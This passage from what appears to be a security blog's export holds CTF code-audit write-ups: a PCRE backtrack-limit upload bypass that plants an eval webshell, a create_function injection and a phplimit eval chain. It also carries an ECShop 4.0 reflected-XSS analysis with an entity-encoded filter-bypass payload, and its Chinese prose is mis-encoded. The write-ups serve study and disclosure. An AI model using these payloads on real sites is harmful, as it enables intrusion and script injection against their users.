<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="meta"># @Author: Cyc1e</span></span><br><span class="line"><span class="meta"># @Date:   2019-10-11 08:44:54</span></span><br><span class="line"><span class="meta"># @Last Modified by:   Cyc1e</span></span><br><span class="line"><span class="meta"># @Last Modified time: 2019-10-11 08:53:12</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1/2018/function/www/index.php?action='</span></span><br><span class="line"><span class="keyword">for</span> i in xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">	<span class="keyword">char</span> = chr(i) + <span class="string">'phpinfo'</span></span><br><span class="line">	url1 = url + <span class="keyword">char</span></span><br><span class="line">	req = requests.<span class="keyword">get</span>(url = url1)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'PHP Version 7.1.9'</span> in req.text:</span><br><span class="line">		print hex(i) + <span class="string">':'</span> + <span class="keyword">char</span></span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>æŠŠæºç ä¸­<code>$action(&#39;&#39;, $arg);</code>æ”¹æˆ<code>$action(&#39;);</code>ï¼Œè·‘ä¸‹fuzzå°±å¥½äº†ğŸ‘‡</p>
<p><img src="/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/8418106-855bde98c6141482.png" alt></p>
<p>æ‰€ä»¥å‰é¢çš„å­—ç¬¦åŠ ä¸Š\ï¼ˆå³å‘½åç©ºé—´ï¼‰ï¼Œå°±å¯ä»¥ç»•è¿‡æ­£åˆ™æ­£å¸¸æ‰§è¡Œï¼Œæ¥ä¸‹åœ¨å°±æ˜¯æ„é€ ä¸€ä¸ªä¸¤ä¸ªå‚æ•°çš„å‡½æ•°ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå‚æ•°å¯æ§ï¼Œåˆ©ç”¨create_functionçš„ä»£ç æ³¨å…¥å°±å¯ä»¥äº†ï¼Œå‚æ•°argçš„ä¸ºğŸ‘‡</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">arg</span>=Cyc1e<span class="comment">;&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
<p>å°±å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°äº†~</p>
<h3 id="pcrewaf"><a href="#pcrewaf" class="headerlink" title="pcrewaf"></a>pcrewaf</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (is_php($data)) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    @mkdir($user_dir, <span class="number">0755</span>);</span></span><br><span class="line"><span class="php">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span></span><br><span class="line"></span><br><span class="line"><span class="php">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>Pç¥çš„å…·ä½“åˆ†æï¼š<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br>PHPç”±äº <strong>.*</strong> åŒ¹é…äº†ä»»æ„å­—ç¬¦ï¼Œè€Œåçš„ <strong>[(`;?&gt;]</strong> åŒ¹é…ä¸­ä¼šè¿›è¡Œå›æº¯ï¼Œå¹¶ä¸”é»˜è®¤è®¾ç½®å›æº¯çš„æ¬¡æ•°ä¸º100Wæ¬¡ï¼Œè‹¥å›æº¯æ¬¡æ•°è¶…è¿‡100Wæ¬¡ï¼Œåˆ™è¿”å›å€¼ä¸ºfalseï¼Œåˆ©ç”¨æ­¤æ¥ç»•è¿‡<code>if (is_php($data))</code>çš„åˆ¤æ–­ï¼Œç›´æ¥æ‰§è¡Œåˆ°æ–‡ä»¶æ“ä½œä»£ç ï¼ŒPç¥çš„POCğŸ‘‡</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> io import BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">'file'</span>: BytesIO(b<span class="string">'aaa&lt;?php eval($_POST[txt]);//'</span> + b<span class="string">'a'</span> * 1000000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(<span class="string">'http://51.158.75.42:8088/index.php'</span>, <span class="attribute">files</span>=files, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line"><span class="builtin-name">print</span>(res.headers)</span><br></pre></td></tr></table></figure>
<p>è‹¥åˆ¤æ–­è®¾ç½®ä¸ºå¼ºç­‰äºï¼Œå³â€˜===â€™ï¼Œåˆ™è¿”å›falseä¸€æ ·åˆ¤æ–­ä¸ºâ€˜bad requestâ€™ã€‚</p>
<p>#phplimit</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span></span><br><span class="line"><span class="php">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure>
<p>æ­£åˆ™ä¹Ÿå°±æ˜¯é™å®šäº†codeåªèƒ½ä¼ å…¥phpå‡½æ•°ï¼Œæ— æ³•æ„é€ ä»»æ„çš„å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæƒ³è¦æ‘†è„±é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯ä¸åœ¨å‚æ•°ä¸­è¿›è¡Œæ„é€ ï¼Œåˆ©ç”¨getå‚æ•°å°†æ„é€ çš„åŒ…å«å°±è¡Œäº†ï¼Œè¿™é‡Œè´´ä¸ªå›¾ğŸ‘‡</p>
<p><img src="/2019/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E4%BA%8C%E5%91%A8%E5%B9%B4%E7%BB%83%E6%89%8B/8418106-dfdc5515bff56a77.png" alt></p>
<p>é¢˜ç›®äº‹nginxç¯å¢ƒï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯ç”¨eval(implode(reset(get_defind_vars())))æ„é€ å°±å¥½äº†ã€‚</p>
<h3 id="easy-phpmagic"><a href="#easy-phpmagic" class="headerlink" title="easy - phpmagic"></a>easy - phpmagic</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span></span><br><span class="line"><span class="php">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">chdir(DATA_DIR);</span></span><br><span class="line"></span><br><span class="line"><span class="php">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span></span><br><span class="line"><span class="php">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Required meta tags --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha256-eSi1q2PG6J7g7ib17yAaWMcrr5GrtohYChqibrV7PBE="</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Domain Detail<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    pre &#123;</span><br><span class="line">        width: 100%;</span><br><span class="line"><span class="css">        <span class="selector-tag">background-color</span>: <span class="selector-id">#f6f8fa</span>;</span></span><br><span class="line">        border-radius: 3px;</span><br><span class="line">        font-size: 85%;</span><br><span class="line"><span class="css">        <span class="selector-tag">line-height</span>: 1<span class="selector-class">.45</span>;</span></span><br><span class="line">        overflow: auto;</span><br><span class="line">        padding: 16px;</span><br><span class="line"><span class="css">        <span class="selector-tag">border</span>: 1<span class="selector-tag">px</span> <span class="selector-tag">solid</span> <span class="selector-id">#ced4da</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group mt-3"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-prepend"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-text"</span> <span class="attr">id</span>=<span class="string">"basic-addon1"</span>&gt;</span>dig -t A -q<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"domain"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"Your domain"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group-append"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-outline-secondary"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>æ‰§è¡Œ<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">"mt-3"</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span></span><br><span class="line"><span class="php">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span></span><br><span class="line"><span class="php">                $output = shell_exec($command);</span></span><br><span class="line"></span><br><span class="line"><span class="php">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span></span><br><span class="line"></span><br><span class="line"><span class="php">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span></span><br><span class="line"><span class="php">                    file_put_contents($log_name, $output);</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> $output;</span></span><br><span class="line"><span class="php">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Cyc1eçš„CTFä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>ECShop 4.0åå°„å‹XSSæ¼æ´åˆ†æ</title>
    <url>/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong>åŸæ–‡å·²å‘<a href="https://www.freebuf.com/vuls/198140.html" target="_blank" rel="noopener">Freebuf ECShop 4.0åå°„å‹XSSæ¼æ´åˆ†æ </a></strong><br><strong>å‰è¨€</strong>ï¼š Ecshopæ˜¯å›½å†…çš„ä¸€æ¬¾å¼€æºçš„ç”µå•†æ¡†æ¶ï¼Œåœ¨å›½å†…åº”ç”¨è¾ƒä¸ºå¹¿æ³›ï¼Œå½“å‰æœ€æ–°ç‰ˆæœ¬ä¸º4.0.0ï¼Œæœ€è¿‘å¯¹å…¶ä»£ç è¿›è¡Œäº†ç®€å•çš„åˆ†æï¼Œå‘ç°å¯ä»¥ç»•è¿‡å…¶filterè§¦å‘XSSã€‚</p>
<h2 id="ä¸€ã€æ¼æ´åˆ©ç”¨æ–¹å¼"><a href="#ä¸€ã€æ¼æ´åˆ©ç”¨æ–¹å¼" class="headerlink" title="ä¸€ã€æ¼æ´åˆ©ç”¨æ–¹å¼"></a><strong>ä¸€ã€æ¼æ´åˆ©ç”¨æ–¹å¼</strong></h2><p>å‘é€GETè¯·æ±‚åŒ…å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>GET/CMS/ECShop_V4.0./user.php HTTP/1.1<br>Referer:<a href="https://127.0.0.1&quot;" target="_blank" rel="noopener">https://127.0.0.1&quot;</a> /&gt;&lt;a href=j&amp;#97v&amp;#97script:&amp;#97lert(â€˜Cyc1e_testâ€™)&gt;&lt;imgsrc=â€xxxxx<br>User-Agent:Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko)Chrome/41.0.2228.0 Safari/537.21<br>Cookie:ECS_ID=17b608d2a679cf2c7e8611581478e6929dbfb34b;ECS[visit_times]=2<br>Connection:<br>keep-aliveAccept: <em>/</em><br>Accept-Encoding:gzip,deflate<br>Host: 127.0.0.1</p>
</blockquote>
<p>å…¶ä¸­æ¼æ´è§¦å‘ä»£ç ä¸ºï¼š</p>
<figure class="highlight leaf"><table><tr><td class="code"><pre><span class="line">Referer:https://127.0.0.1" /&gt;&lt;ahref=j&amp;#97v&amp;#97script:&amp;<span class="function"><span class="keyword">#</span>97<span class="title">lert</span><span class="params">('<span class="variable">Cyc1e_test</span>')</span></span>&gt;&lt;imgsrc="xxxxx</span><br></pre></td></tr></table></figure>

<p>å®ç°ç»•è¿‡è¿‡æ»¤è§„åˆ™ï¼Œè§¦å‘XSSæ¼æ´çš„æ•ˆæœã€‚</p>
<p><strong>äºŒã€ç›¸å…³ç¯å¢ƒ</strong></p>
<p>ç‰ˆæœ¬ï¼šECShop4.0.0</p>
<p>æ¼æ´ç±»å‹ï¼šåå°„å‹XSS</p>
<p>æœ¬åœ°ç¯å¢ƒï¼šphp5.6.27+ Apache + Mysql</p>
<p><strong>ä¸‰ã€æ¼æ´åˆ†æ</strong></p>
<p>è¯¥XSSæ¼æ´è·¯å£ç‚¹åœ¨user.phpæ–‡ä»¶ï¼ŒæŸ¥çœ‹user.phpï¼š328è¡Œ</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-3f519e16f6df1c85.jpg" alt></p>
<p>åœ¨ç”¨æˆ·ç™»å…¥ç•Œé¢çš„å¤„ç†ä»£ç ä¸­ï¼Œé¦–å…ˆå˜é‡$actionèµ‹å€¼ä¸ºloginè¿›å…¥ä¸»ä½“ä»£ç ï¼Œè‹¥å˜é‡$back_actä¸ºç©ºå¹¶ä¸”è¯·æ±‚åŒ…ä¸­å­˜åœ¨REFERERå­—æ®µï¼Œåˆ™å°†REFERERå­—æ®µä¸­çš„å†…å®¹èµ‹å€¼ç»™å˜é‡$back_actï¼Œè¿™æ˜¯å¯¼è‡´è¯¥æ¼æ´çš„ç›´æ¥åŸå› ï¼Œå¯¹$back_actå˜é‡èµ‹å€¼è¿‡åä¼ å…¥assignå‡½æ•°è¿›è¡Œå¤„ç†ï¼Œå…¶ä¸­$smartyæ˜¯æ¨¡ç‰ˆç±»cls_templateçš„å®ä¾‹åŒ–ï¼š/includes/init.phpï¼š170è¡Œ</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-6c0758d2cf944031.jpg" alt></p>
<p>æ‰€ä»¥æŸ¥çœ‹assignå‡½æ•°æ—¶è·Ÿè¿›åˆ°æ¨¡ç‰ˆç±»cls_templateä¸­æŸ¥çœ‹ï¼š/includes/ cls_template.phpï¼š70è¡Œ</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-b3b37cd4da498647.jpg" alt></p>
<p>å¯¹ä¼ å…¥å˜é‡åå’Œå˜é‡å€¼è¿›è¡Œå˜é‡æ³¨å†Œï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥éæ•°ç»„æ•°æ®å¯¹$back_actè¿›è¡Œå˜é‡æ³¨å†Œï¼Œæ³¨å†Œå®Œæ¯•å›åˆ°user.phpä»£ç ï¼Œç»§ç»­è·Ÿè¿›æ¨¡ç‰ˆç±»ä¸­çš„displayå‡½æ•°ï¼š/includes/ cls_template.phpï¼š100è¡Œ</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-694cf27e9ba6dfff.jpg" alt></p>
<p>è°ƒç”¨fetchå‡½æ•°è¿›è¡Œuser_passport.dwtæ–‡ä»¶çš„é¡µé¢æ˜¾ç¤ºï¼Œä¹Ÿå°±æ˜¯æ˜¾ç¤ºç”¨æˆ·ç™»å…¥é¡µé¢ï¼Œå…¶ä¸­åœ¨user_passport.dwtæ–‡ä»¶ä¸­ï¼š</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-535f6da968dcc931.jpg" alt></p>
<p>$back_actå€¼è¢«èµ‹å€¼ç»™inputæ ‡ç­¾ä¸­çš„value,æ‰€ä»¥æˆ‘ä»¬æ§åˆ¶äº†$back_actå˜é‡å€¼ä¾¿å¯ä»¥åœ¨htmlé¡µé¢ä¸­æ’å…¥jsä»£ç ã€‚</p>
<p><strong>å››ã€ç»•è¿‡å…¨å±€Wafè§¦å‘XSS</strong></p>
<p>Ecshopä¸­å®šä¹‰äº†å…¨å±€å®‰å…¨è¿‡æ»¤è§„åˆ™ï¼ŒæŸ¥çœ‹ä»£ç ï¼š/includes/safety.php</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-5e182b4b3d983d09.jpg" alt></p>
<p>è¿™ä¸ªè¿‡æ»¤è§„åˆ™æ¯”è¾ƒç®€å•ç²—æš´ï¼Œåˆ©ç”¨â€™on[a-zA-Z]{3,15}â€™ è¿‡æ»¤äº†æ‰€æœ‰çš„onå¼€å¤´jsäº‹ä»¶ï¼Œæ‰€ä»¥ç”¨äº‹ä»¶è§¦å‘æ˜¯è¾ƒä¸ºå›°éš¾äº†ï¼Œå¹¶ä¸”&lt;scriptã€alertã€evalã€dataã€Javascriptç­‰æ•æ„Ÿå­—ç¬¦ï¼Œç»§ç»­æŸ¥çœ‹ä»£ç ï¼š</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-c26e9b6986f24f42.jpg" alt></p>
<p>$back_actçš„å€¼å¦‚æœä¸æ˜¯æ•°ç»„ä¾¿ä¼ å…¥filter()å‡½æ•°ä¸­åˆ©ç”¨preg_matchè¿›è¡Œå­—ç¬¦æ ¡éªŒï¼Œè¿™é‡Œåˆ©ç”¨äº†/iï¼Œæ‰€ä»¥ä¸åŒºåˆ†å¤§å°å†™ï¼Œæ— æ³•åˆ©ç”¨å¤§å°å†™çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œä¸è¿‡è¿™é‡Œçš„æ•æ„Ÿå­—ç¬¦è¿‡æ»¤ä¹Ÿä¸å…¨ï¼Œä¾‹å¦‚å¯¹äºå¼¹çª—çš„jså‡½æ•°confirmå°±å¯ä»¥è¢«åˆ©ç”¨ï¼Œæ‰€ä»¥ä¸»è¦è€ƒè™‘çš„æ˜¯å¦‚ä½•ç»•è¿‡è¿‡æ»¤æ£€æµ‹ã€‚<br>æˆ‘åˆ©ç”¨äº†HTMLçš„å®ä½“ç¼–ç æ¥è¿›è¡Œç»•è¿‡ï¼Œåœ¨ HTML ä¸­ï¼ŒæŸäº›å­—ç¬¦æ˜¯é¢„ç•™çš„ï¼Œæ¯”å¦‚ä¸èƒ½ä½¿ç”¨å°äºå·ï¼ˆ&lt;ï¼‰å’Œå¤§äºå·ï¼ˆ&gt;ï¼‰ï¼Œè¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯æ ‡ç­¾ã€‚å¦‚æœå¸Œæœ›æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ HTML æºä»£ç ä¸­ä½¿ç”¨å­—ç¬¦å®ä½“ï¼Œå¦‚éœ€æ˜¾ç¤ºå°äºå·ï¼Œæˆ‘ä»¬å¿…é¡»è¿™æ ·å†™ï¼š&lt; æˆ– &lt;ï¼Œå…¶ä¸­â€™&lt; â€˜ä¾¿æ˜¯å°äºå·ï¼ˆ&lt;ï¼‰çš„HTMLå®ä½“ç¼–ç ï¼Œå¹¶ä¸”ä¸ä»…æ˜¯ â€œ&lt;â€â€&gt;â€ è¿™æ ·çš„èƒ½ç¼–ç ï¼Œæ‰€æœ‰å­—ç¬¦å‡èƒ½ç¼–ç ï¼Œa-zA-Zçš„HTMLå®ä½“ç¼–ç æ–¹å¼æ˜¯&amp;#[å­—ç¬¦ACCIIç¼–ç ]ï¼Œä¾‹å¦‚a-&gt;&amp;#97ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸€ç¼–ç æ–¹å¼è¿›è¡Œæ„é€ POCï¼š</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Referer: [<span class="string">https://127.0.0.1</span>](<span class="link">https://127.0.0.1</span>)"/&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#97v&amp;#97script:&amp;#97lert(</span>'<span class="attr">Cyc1e_test</span>')&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">imgsrc="xxxxx</span></span></span></span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­j&amp;#97v&amp;#97script:&amp;#97lert(â€˜Cyc1e_testâ€™)å¯ä»¥ç»•è¿‡xssè¿‡æ»¤è§„åˆ™çš„åŒ¹é…ä»è€Œç»•è¿‡æœåŠ¡ç«¯çš„å®‰å…¨è¿‡æ»¤æ¤å…¥htmlé¡µé¢ä¸­ï¼Œç»è¿‡htmlç¼–ç è§£æä¼šæ¢å¤æˆjavascript:alert(â€˜Cyc1e_testâ€™)ï¼Œä»è€Œè§¦å‘æ‰§è¡Œï¼Œæ•ˆæœå¦‚å›¾ï¼š</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-db65b832df1ea656.jpg" alt></p>
<p>é€šè¿‡ç‚¹å‡»å›¾ç‰‡å¯ä»¥ç›´æ¥è§¦å‘</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-cf996e66924cb887.jpg" alt></p>
<p>æ¼æ´ç»•è¿‡è§¦å‘çš„æ–¹å¼ä¸å”¯ä¸€ã€‚</p>
]]></content>
      <categories>
        <category>Cyc1eçš„æ¼æ´æŒ–æ˜ä¹‹è·¯</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>Seacms 6.54 &amp; 6.55 ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</title>
